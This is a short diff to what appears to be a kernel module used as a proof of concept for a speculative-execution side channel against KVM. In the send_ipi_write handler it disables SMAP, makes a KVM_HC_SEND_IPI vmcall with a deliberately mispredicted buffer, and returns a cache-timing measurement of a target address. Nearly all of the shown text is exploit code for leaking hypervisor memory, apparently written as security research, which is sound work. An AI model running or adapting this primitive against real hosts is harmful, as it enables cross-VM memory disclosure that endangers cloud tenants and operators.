@@ -10,6 +10,7 @@
 #include "cache_eviction.h"
 #include "hypercall.h"
 #include "linux/gfp_types.h"
+#include "timing.h"
 
 static struct proc_dir_entry *proc_root;
 static struct proc_dir_entry *proc_send_ipi;
@@ -51,13 +52,18 @@ static ssize_t send_ipi_write(struct file *file, const char __user *buff, size_t
                : "+a"(type), "+b"(opts.real.mask_low), "+c"(opts.real.mask_low), "+d"(opts.real.min),
                  "+S"(opts.real.icr.raw_icr));
 
+  disable_smap();
+
   // Do the vmcall, this time with the mispredicted buffer
   type = KVM_HC_SEND_IPI;
   asm volatile("vmcall"
                : "+a"(type), "+b"(opts.mispredicted.mask_low), "+c"(opts.mispredicted.mask_low),
                  "+d"(opts.mispredicted.min), "+S"(opts.mispredicted.icr.raw_icr));
 
-  return type;
+  size_t time = access_time(opts.ptr);
+  enable_smap();
+
+  return time;
 }
 
 static inline __attribute__((always_inline)) size_t
